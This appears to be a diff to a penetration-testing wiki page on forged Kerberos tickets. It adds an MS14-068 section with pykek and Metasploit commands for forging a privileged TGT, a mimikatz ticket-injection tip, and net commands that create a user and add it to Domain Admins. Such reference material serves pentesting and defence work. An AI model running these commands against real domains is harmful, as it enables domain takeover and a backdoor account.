@@ -21,20 +21,6 @@ The **Bronze bit** vulnerability \(CVE-2020-17049\) introduced the possibility o
 
 The following parts allow to obtain modified or crafted Kerberos tickets. Once obtained, these tickets can be used with [Pass-the-Ticket](pass-the-ticket.md).
 
-{% hint style="info" %}
-**Tip: convert ticket to UNIX &lt;-&gt; Windows format**
-
-To convert tickets between UNIX/Windows format with [ticketConverter.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py).
-
-```bash
-# Windows -> UNIX
-ticketConverter.py $ticket.kirbi $ticket.ccache
-
-# UNIX -> Windows
-ticketConverter.py $ticket.ccache $ticket.kirbi
-```
-{% endhint %}
-
 ### Golden ticket
 
 {% hint style="warning" %}
@@ -145,9 +131,42 @@ getST.py -force-forwardable -spn $Target_SPN -impersonate Administrator -dc-ip $
 
 The SPN \(ServicePrincipalName\) set will have an impact on what services will be reachable. For instance, `cifs/target.domain` or `host/target.domain` will allow most remote dumping operations \(more info on [adsecurity.org](https://adsecurity.org/?page_id=183)\).
 
-### 🛠️ MS14-068 \(CVE-2014-6324\)
+### MS14-068 \(CVE-2014-6324\)
 
-//TODO
+This vulnerability allows attackers to forge a TGT with unlimited power \(i.e. with a modified PAC stating the user is a member of privileged groups\). This attack is similar to the [golden ticket](forged-tickets.md#golden-ticket), however, it doesn't require the attacker to know the `krbtgt`. This attack is a really powerful privilege escalation technique. However, it will not work on patched domain controllers.
+
+{% tabs %}
+{% tab title="pykek" %}
+This attack can be operated with [pykek](https://github.com/mubix/pykek)'s [ms14-068](https://github.com/mubix/pykek/blob/master/ms14-068.py) Python script. The script can carry out the attack with a cleartext password or with [pass-the-hash](../abusing-lm-and-ntlm/pass-the-hash.md).
+
+```bash
+# with a plaintext password
+ms14-068.py -u 'USER'@'DOMAIN_FQDN' -p 'PASSWORD' -s 'USER_SID' -d 'DOMAIN_CONTROLLER'
+
+# with pass-the-hash
+ms14-068.py -u 'USER'@'DOMAIN_FQDN' --rc4 'NThash' -s 'USER_SID' -d 'DOMAIN_CONTROLLER'
+```
+
+If the attack is successful, the script will write a `.ccache` ticket that will be usable with [pass-the-ticket](pass-the-ticket.md).
+{% endtab %}
+
+{% tab title="metasploit" %}
+Using the Metasploit Framework can sometimes be more useful since it prints valuable error information.
+
+```bash
+msf6 > use admin/kerberos/ms14_068_kerberos_checksum
+```
+{% endtab %}
+{% endtabs %}
+
+{% hint style="warning" %}
+In some scenarios, I personally have had trouble using the `.ccache` ticket on UNIX-like systems. What I did was [convert it](pass-the-ticket.md#practice) to `.kirbi`, switch to a Windows system, inject the ticket with mimikatz's `kerberos:ptt` command, and then create a new user and add it to the domain admins group.
+
+```bash
+net user "hacker" "132Pentest!!!" /domain /add
+net group "Domain Admins" /domain /add
+```
+{% endhint %}
 
 ## References
 
@@ -160,4 +179,8 @@ The SPN \(ServicePrincipalName\) set will have an impact on what services will b
 {% embed url="https://en.hackndo.com/kerberos" caption="" %}
 
 {% embed url="https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-overview/" caption="" %}
+
+{% embed url="https://labs.f-secure.com/archive/digging-into-ms14-068-exploitation-and-defence/" %}
+
+
 
